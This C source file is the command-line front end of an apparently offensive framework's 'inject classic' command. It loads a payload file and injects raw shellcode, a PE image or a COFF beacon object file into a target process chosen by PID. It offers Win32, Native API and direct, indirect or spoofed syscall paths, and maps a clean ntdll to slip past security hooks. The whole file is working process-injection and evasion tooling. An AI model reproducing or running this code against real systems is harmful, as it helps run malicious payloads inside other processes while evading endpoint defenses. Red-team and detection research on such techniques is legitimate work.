#include <sindri.h>
#include <unified/cli.h>
#include <unified/commands.h>
#include <unified/common.h>
#include <unified/print.h>
#include <unified/syscall_cfg.h>

static void print_usage(const char *prog) {
    usage_header(prog, "inject", "classic", "<mode> -f <payload_path> -p <target_pid> [options]");
    poc_fprintf("\nModes:\n");
    usage_mode("shell", "Inject raw shellcode");
    usage_mode("pe", "Inject PE (DLL or EXE)");
    usage_mode("coff", "Inject COFF (.obj)");
    poc_fprintf("\nOptions:\n");
    usage_opt("-f", "<path>", "Path to the payload.");
    usage_opt("-p", "<pid>", "Process ID of the remote target process.");
    usage_opt("-e", "<name>", "[COFF] Name of the entry point function (default: 'go').");
    usage_opt("-a", "<args>", "[COFF] Arguments string to pass to the BOF.");
    usage_opt("", "--win", "Use Win32 API for loader.");
    usage_opt("", "--nt", "Use Native API for injection + loader (default).");
    usage_opt("", "--sys", "Use direct syscalls for injection + loader.");
    usage_opt("", "--invoke-direct", "Syscall invoker: direct assembly.");
    usage_opt("", "--invoke-indirect", "Syscall invoker: indirect assembly (default with --sys).");
    usage_opt("", "--invoke-spoofed", "Syscall invoker: spoofed / stack-duplicated assembly.");
    usage_opt("", "--resolve-scan", "SSN resolver: in-memory scan (default).");
    usage_opt("", "--resolve-sort", "SSN resolver: export-table sort.");
}

int cmd_inject_classic(int argc, char *argv[], const char *prog) {
    if (argc < 1) {
        print_usage(prog);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    const char *mode = argv[0];
    if (poc_strcmp(mode, "-h") == 0 || poc_strcmp(mode, "--help") == 0) {
        print_usage(prog);
        return SND_SUCCESS;
    }

    const char     *file_path = NULL, *entry_name = "go";
    DWORD           target_pid  = 0;
    char           *bof_args    = NULL;
    int             bof_arg_len = 0;
    api_backend_t   backend     = API_NT;
    syscall_style_t scfg        = {.invoke = INVOKE_INDIRECT, .resolve_scan = 0, .resolve_sort = 0};

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (poc_strcmp(a, "-f") == 0) {
            if (require_arg(argc, argv, i, "-f")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            file_path = argv[++i];
            continue;
        }
        if (poc_strcmp(a, "-p") == 0) {
            if (require_arg(argc, argv, i, "-p")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            target_pid = (DWORD)poc_strtoul(argv[++i], NULL, 0);
            continue;
        }
        if (poc_strcmp(a, "-e") == 0) {
            if (require_arg(argc, argv, i, "-e")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            entry_name = argv[++i];
            continue;
        }
        if (poc_strcmp(a, "-a") == 0) {
            if (require_arg(argc, argv, i, "-a")) {
                print_usage(prog);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            bof_args    = argv[++i];
            bof_arg_len = (int)poc_strlen(bof_args) + 1;
            continue;
        }
        if (!parse_backend(argc, argv, &i, &backend))
            continue;
        if (!parse_syscall_style(argc, argv, &i, &scfg))
            continue;

        log_err("Unknown argument: %s", a);
        print_usage(prog);
        return SND_STATUS_INVALID_COMMAND_LINE_ARG;
    }

    if (!file_path || !target_pid) {
        log_err("Both -f and -p are required.");
        print_usage(prog);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    snd_status_t st       = SND_OK;
    snd_buffer_t file_buf = {0};
    PVOID        ntdll    = NULL;

    const snd_memory_api_t  *mem_api  = NULL;
    const snd_module_api_t  *mod_api  = NULL;
    const snd_process_api_t *proc_api = NULL;

    if (backend == API_SYS) {
        st = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
        if (SND_FAILED(st))
            goto cleanup;
        snd_ntdll_set_clean(ntdll);
        apply_syscall_style(&scfg);

        mem_api  = &snd_mem_sys;
        mod_api  = &snd_mod_nt;
        proc_api = &snd_proc_sys;
        log_ok("Syscall mode active (known-dll mapped clean ntdll).");
    } else if (backend == API_NT) {
        mem_api  = &snd_mem_nt;
        mod_api  = &snd_mod_nt;
        proc_api = &snd_proc_nt;
        log_ok("Native API mode active (ntdll exports).");
    } else {
        mem_api  = &unified_mem_win;
        mod_api  = &unified_mod_win;
        proc_api = &unified_proc_win;
        log_ok("Win32 API mode active.");
    }

    log_info("Loading payload: %s", file_path);
    st = unified_file_load(backend, file_path, &file_buf);
    if (SND_FAILED(st))
        goto cleanup;

    if (poc_strcmp(mode, "shell") == 0) {
        snd_inj_ctx_t inj = {0};
        inj.target_pid    = target_pid;
        inj.payload       = &file_buf;
        inj.proc_api      = proc_api;
        log_info("Firing classic shellcode injection...");
        st = snd_inj_classic_shell(&inj);
        if (SND_SUCCEEDED(st))
            log_ok("Injection completed successfully!");
        snd_inj_cleanup(&inj);
    } else if (poc_strcmp(mode, "pe") == 0) {
        snd_ldr_pe_ctx_t ldr = {0};
        snd_inj_ctx_t    inj = {0};
        ldr.mem_api          = mem_api;
        ldr.mod_api          = mod_api;
        ldr.raw_source       = &file_buf;
        inj.target_pid       = target_pid;
        inj.proc_api         = proc_api;
        log_info("Firing classic PE injection...");
        st = snd_inj_classic_pe(&ldr, &inj);
        if (SND_SUCCEEDED(st))
            log_ok("Injection completed successfully!");
        snd_inj_cleanup(&inj);
        snd_ldr_pe_free_mapped_image(&ldr);
    } else if (poc_strcmp(mode, "coff") == 0) {
        snd_ldr_coff_ctx_t ldr = {0};
        snd_inj_ctx_t      inj = {0};
        ldr.mem_api            = mem_api;
        ldr.mod_api            = mod_api;
        ldr.raw_source         = &file_buf;
        inj.target_pid         = target_pid;
        inj.proc_api           = proc_api;
        log_info("Firing classic COFF injection...");
        st = snd_inj_classic_coff(&ldr, &inj, entry_name, bof_args, bof_arg_len);
        if (SND_SUCCEEDED(st))
            log_ok("Injection completed successfully!");
        snd_inj_cleanup(&inj);
        snd_ldr_coff_free_mapped_image(&ldr);
    } else {
        log_err("Unknown mode: %s. Use shell, pe, or coff.", mode);
        st = SND_ERR(SND_STATUS_INVALID_COMMAND_LINE_ARG);
    }

cleanup:
    snd_buffer_free(&file_buf);
    if (SND_FAILED(st)) {
        snd_status_print(st);
        return st.code;
    }
    return SND_SUCCESS;
}
